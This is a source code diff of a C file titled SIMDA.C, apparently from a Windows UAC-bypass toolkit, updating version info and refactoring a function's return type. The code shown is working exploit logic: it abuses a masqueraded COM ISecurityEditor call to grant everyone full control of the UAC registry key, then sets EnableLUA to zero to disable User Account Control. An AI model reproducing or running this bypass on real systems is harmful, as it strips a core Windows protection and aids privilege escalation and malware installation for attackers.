@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2015 - 2018
+*  (C) COPYRIGHT AUTHORS, 2015 - 2019
 *
 *  TITLE:       SIMDA.C
 *
-*  VERSION:     3.11
+*  VERSION:     3.17
 *
-*  DATE:        23 Aug 2018
+*  DATE:        18 Mar 2019
 *
 *  Simda based UAC bypass using ISecurityEditor.
 *
@@ -86,18 +86,18 @@ DWORD WINAPI ucmMasqueradedAlterObjectSecurityCOM(
         }
 
 #ifdef _DEBUG
-         pps = NULL;
-         r = SecurityEditor->lpVtbl->GetSecurity(
-             SecurityEditor,
-             lpTargetObject,
-             ObjectType,
-             SecurityInformation,
-             &pps
-         );
+        pps = NULL;
+        r = SecurityEditor->lpVtbl->GetSecurity(
+            SecurityEditor,
+            lpTargetObject,
+            ObjectType,
+            SecurityInformation,
+            &pps
+        );
 
-         if ((r == S_OK) && (pps != NULL)) {
-             OutputDebugStringW(pps);
-         }
+        if ((r == S_OK) && (pps != NULL)) {
+            OutputDebugStringW(pps);
+        }
 #endif
 
         r = SecurityEditor->lpVtbl->SetSecurity(
@@ -137,11 +137,11 @@ DWORD WINAPI ucmMasqueradedAlterObjectSecurityCOM(
 * Fixed in Windows 10 TH1
 *
 */
-BOOL ucmSimdaTurnOffUac(
+NTSTATUS ucmSimdaTurnOffUac(
     VOID
 )
 {
-    BOOL               bResult = FALSE;
+    NTSTATUS           MethodResult = STATUS_ACCESS_DENIED;
     HANDLE             hKey = NULL;
     DWORD              dwValue;
     WCHAR              szBuffer[MAX_PATH];
@@ -149,34 +149,34 @@ BOOL ucmSimdaTurnOffUac(
     OBJECT_ATTRIBUTES  obja;
     UNICODE_STRING     usEnableLua = RTL_CONSTANT_STRING(L"EnableLUA");
 
-    bResult = ucmMasqueradedAlterObjectSecurityCOM(T_UACKEY,
-        DACL_SECURITY_INFORMATION, SE_REGISTRY_KEY, T_SDDL_ALL_FOR_EVERYONE);
-
-    if (bResult) {
-
+    if (ucmMasqueradedAlterObjectSecurityCOM(T_UACKEY,
+        DACL_SECURITY_INFORMATION, SE_REGISTRY_KEY, T_SDDL_ALL_FOR_EVERYONE))
+    {
         RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
         _strcpy(szBuffer, T_REGISTRY_PREP);
         _strcat(szBuffer, T_UACKEY);
         RtlInitUnicodeString(&ustr, szBuffer);
         InitializeObjectAttributes(&obja, &ustr, OBJ_CASE_INSENSITIVE, NULL, NULL);
-        if (NT_SUCCESS(NtOpenKey(&hKey, MAXIMUM_ALLOWED, &obja))) {
+
+        MethodResult = NtOpenKey(&hKey, MAXIMUM_ALLOWED, &obja);
+        if (NT_SUCCESS(MethodResult)) {
 
             dwValue = 0;
-            bResult = NT_SUCCESS(NtSetValueKey(
+            MethodResult = NtSetValueKey(
                 hKey,
                 &usEnableLua,
                 0,
                 REG_DWORD,
                 (PVOID)&dwValue,
-                sizeof(DWORD)));
+                sizeof(DWORD));
 
             NtClose(hKey);
         }
     }
 
-    if (bResult) {
+    if (NT_SUCCESS(MethodResult)) {
         ucmShowMessage(g_ctx->OutputToDebugger, L"UAC is now disabled.\nYou must reboot your computer for the changes to take effect.");
     }
 
-    return bResult;
+    return MethodResult;
 }
